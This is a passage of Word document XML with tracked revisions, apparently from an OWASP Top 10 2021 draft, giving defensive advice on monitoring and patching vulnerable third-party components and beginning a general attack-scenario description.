          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> retire.js, etc. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2850F07D" w14:textId="513A4571" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2337" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2338" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Continuously monitor sources like </w:t>
      </w:r>
      <w:del w:id="2339" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>CVE</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2340" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Common Vulnerability</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4426BF54" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2341" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2342" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Exposures (CVE) and National Vulnerability Database (</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NVD</w:t>
      </w:r>
      <w:ins w:id="2343" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D86E424" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2344" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2345" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerabilities in the components. Use software composition analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEAFEC3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2346" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2347" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> tools to automate the process. Subscribe to email alerts for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043C55D6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2348" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> security vulnerabilities related to components you use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B5A1CD" w14:textId="4386E92D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2349" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2350" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="680CEBA5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2351" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2352" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Only obtain components from official sources over secure links.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B8FF4B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2353" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2354" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prefer signed packages to reduce the chance of including a modified,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E26BEBC" w14:textId="29AC371F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2355" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> malicious component</w:t>
      </w:r>
      <w:del w:id="2356" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2357" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> (See A08:2021-Software and Data Integrity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4F6FE7A5" w14:textId="4ECB5696" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2358" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2359" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2360" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Failures).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13168B5F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2361" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62ED7A99" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2362" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2363" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Monitor for libraries and components that are unmaintained or do not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B853D89" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2364" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2365" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> create security patches for older versions. If patching is not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51969792" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2366" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2367" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> possible, consider deploying a virtual patch to monitor, detect, or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19419DF9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2368" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> protect against the discovered issue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05561C72" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="538E03BA" w14:textId="59C28D1D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2369" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Every organization must ensure </w:t>
      </w:r>
      <w:del w:id="2370" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">that there is </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>an ongoing plan for monitoring, triaging,</w:t>
      </w:r>
      <w:del w:id="2371" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0A31C6E6" w14:textId="17AC6E00" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2372" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and applying updates or configuration changes for the lifetime of the</w:t>
      </w:r>
      <w:del w:id="2373" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="32A80E3E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>application or portfolio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74372C33" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03A78BE7"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 Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAEDBA2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="482CB0F7" w14:textId="47BB356C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2374" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #1</w:t>
      </w:r>
      <w:del w:id="2375" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2376" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Components typically run with the same privileges as</w:t>
      </w:r>
      <w:del w:id="2377" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="758DC8C5" w14:textId="73FD4B92" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2378" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the application itself, so flaws in any component can result in serious</w:t>
      </w:r>
      <w:del w:id="2379" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5B5C33FD" w14:textId="281102C2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2380" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>impact. Such flaws can be accidental (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="2381" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2382" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> coding error) or intentional</w:t>
      </w:r>
      <w:del w:id="2383" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7B4345A7" w14:textId="2FE9145F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2384" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
